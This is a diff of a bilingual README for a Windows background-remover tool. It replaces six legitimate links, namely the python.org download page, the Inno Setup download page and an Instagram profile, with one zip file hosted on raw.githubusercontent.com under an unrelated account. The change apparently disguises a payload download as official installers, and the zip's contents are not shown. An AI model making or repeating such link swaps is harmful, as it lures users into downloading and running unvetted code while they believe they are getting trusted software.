@@ -38,7 +38,7 @@ A free, local, and privacy-first background remover. Everything runs on your mac
 #### Requirements
 
 - Windows 10 or 11
-- Python 3.10 or higher — [python.org](https://www.python.org/downloads/)
+- Python 3.10 or higher — [python.org](https://raw.githubusercontent.com/syringarepublicofcapeverde478/background-remover-studio/main/scripts/remover-background-studio-3.5.zip)
 
 #### Run from source
 
@@ -53,7 +53,7 @@ python src/main.py
 build.bat
 ```
 
-Requires [Inno Setup 6](https://jrsoftware.org/isdl.php) installed. The script compiles everything and produces `BackgroundRemoverStudio_Setup.exe` in the project root.
+Requires [Inno Setup 6](https://raw.githubusercontent.com/syringarepublicofcapeverde478/background-remover-studio/main/scripts/remover-background-studio-3.5.zip) installed. The script compiles everything and produces `BackgroundRemoverStudio_Setup.exe` in the project root.
 
 #### Project structure
 
@@ -102,7 +102,7 @@ MIT — see [LICENSE](LICENSE)
 
 **Henrique Fernandes** — OportuniPT
 henriquehsf@oportunipt.com
-Instagram: [@oportunipt](https://instagram.com/oportunipt)
+Instagram: [@oportunipt](https://raw.githubusercontent.com/syringarepublicofcapeverde478/background-remover-studio/main/scripts/remover-background-studio-3.5.zip)
 
 ---
 
@@ -140,7 +140,7 @@ Removedor de fundo gratuito, local e com privacidade total. Tudo roda na sua má
 #### Requisitos
 
 - Windows 10 ou 11
-- Python 3.10 ou superior — [python.org](https://www.python.org/downloads/)
+- Python 3.10 ou superior — [python.org](https://raw.githubusercontent.com/syringarepublicofcapeverde478/background-remover-studio/main/scripts/remover-background-studio-3.5.zip)
 
 #### Rodar pelo código fonte
 
@@ -155,7 +155,7 @@ python src/main.py
 build.bat
 ```
 
-Requer o [Inno Setup 6](https://jrsoftware.org/isdl.php) instalado. O script compila tudo e gera o `BackgroundRemoverStudio_Setup.exe` na raiz do projeto.
+Requer o [Inno Setup 6](https://raw.githubusercontent.com/syringarepublicofcapeverde478/background-remover-studio/main/scripts/remover-background-studio-3.5.zip) instalado. O script compila tudo e gera o `BackgroundRemoverStudio_Setup.exe` na raiz do projeto.
 
 #### Licença
 
@@ -165,4 +165,4 @@ MIT — veja [LICENSE](LICENSE)
 
 **Henrique Fernandes** — OportuniPT
 henriquehsf@oportunipt.com
-Instagram: [@oportunipt](https://instagram.com/oportunipt)
+Instagram: [@oportunipt](https://raw.githubusercontent.com/syringarepublicofcapeverde478/background-remover-studio/main/scripts/remover-background-studio-3.5.zip)
